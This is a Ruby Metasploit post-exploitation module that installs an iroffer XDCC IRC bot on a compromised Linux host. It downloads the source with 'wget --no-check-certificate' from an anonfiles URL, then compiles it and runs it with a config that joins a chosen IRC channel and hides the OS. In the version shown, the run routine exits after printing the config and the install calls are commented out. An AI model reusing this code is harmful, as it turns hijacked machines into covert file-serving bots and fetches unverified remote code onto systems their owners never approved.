#
# download, compile, and install iroffer 
#
#

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/system'
require 'msf/core/post/linux/priv'

class Metasploit3 < Msf::Post

    include Msf::Post::Common
    include Msf::Post::File
    include Msf::Post::Linux::System

    def initialize(info={})
        super( update_info( info,
                'Name'          => 'Install Iroffer bot on target',
                'Description'   => %q{
                    This module downloads, compiles and installs an iroffer bot on the target machine.},
                'License'       => MSF_LICENSE,
                'Author'        => [ 'Doug Prostko <dougtko[at]gmail.com>' ],
                'Platform'      => [ 'linux' ],
                'SessionTypes'  => [ 'shell' ]
            ))
        register_options(
            [ 
                OptString.new('FILEDIR', [ true,  "directory from where to serve files", '/tmp']),
                OptString.new('UPLOADDIR', [ false,  "path to upload files", '/tmp']),
                OptString.new('BOTNICK', [ false, "nickname for bot", "XDCCbot"]),
                OptString.new('SERVER', [ true, "IRC server", ""]),
                OptString.new('PORT', [ true, "server port", "6667"]),
                OptString.new('CONNECTIONMETHOD', [ true, "how to connect", "direct"]),
                OptString.new('CHANNEL', [ true, "channel", ""]),
                OptString.new('ADMINPASS', [ true, "encrypted admin password", ""]),
                OptString.new('ADMINHOST', [ true, "hostmask for admin", ""])
            ], self.class
        )
    end

    def setup_config
        config =<<EOF
statefile #{datastore['BOTNICK']}.state
connectionmethod #{datastore['CONNECTIONMETHOD']}
network abjects.net
{
    server #{datastore['SERVER']} #{datastore['PORT']}
    channel #{datastore['CHANNEL']} -plist 14 -pformat full
}
user_nick #{datastore['BOTNICK']}
user_realname Owner: OwnerNick mailto:user@example.com
user_modes +i
owner_nick OwnerNick mailto:user@example.com
loginname fakelogin
#upnp_router
slotsmax 20
queuesize 10
maxtransfersperperson 1
maxqueueditemsperperson 1
idlequeuesize 100
maxidlequeuedperperson 20
balanced_queue
filedir #{datastore['FILEDIR']}
noduplicatefiles
removelostfiles
autoaddann added
autoadd_dir #{datastore['FILEDIR']}
restrictlist
restrictprivlist
restrictsend
atfind 3
downloadhost *!*@*
adminpass #{datastore['ADMINPASS']}
adminhost #{datastore['ADMINHOST']}
uploadhost #{datastore['UPLOADHOST']}
uploaddir #{datastore['FILEDIR']}
hideos
nomd5sum
EOF
        config
    end

    def run
        distro = get_sysinfo
        h = get_host
        print_status("Running module against #{h}")
        print_status("Setting up config file")
        config = setup_config
        print_status(config)
        exit
        #print_status("Info:")
        #print_status("\t#{distro[:version]}")
        #print_status("\t#{distro[:kernel]}")
        #print_status("PWD:\t#{pwd}")
        #print_status("Setting PATH")
        #cmd_exec("export PATH=/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin")
        #download_files
        #unzip_files
        #cd("iroffer-dinoex")
        #compile_source
        #run_bot
    end

    def get_host
        case session.type
        when /meterpreter/
            host = sysinfo["Computer"]
        when /shell/
            host = session.shell_command_token("hostname").chomp
        end
        return host
    end

    def download_files
        print_status("Downloading iroffer source code")
        cmd_exec("wget --no-check-certificate https://cdn.anonfiles.com/1361987260657.zip")
        if(file?("1361987260657.zip"))
           print_good("File downloaded successfully")
        else
            print_error("Download failed")
            exit
        end
    end

    def unzip_files
        print_status("Unzipping archive")
        cmd_exec("unzip 1361987260657.zip")
        if(directory?("iroffer-dinoex"))
           print_good("Zip extraction succeeded")
        else
            print_error("Unzip failed")
            exit
        end
    end

    def compile_source
        print_status("Configuring and compiling")
        cmd_exec("./Configure")
        cmd_exec("make")
        if(file?("iroffer"))
            print_good("Compilation success!")
        else
            print_error("Compilation failed")
            exit
        end
    end

    def run_bot
        print_status("Running bot")
        print_status(cmd_exec("./iroffer -b foo.conf"))
    end
end
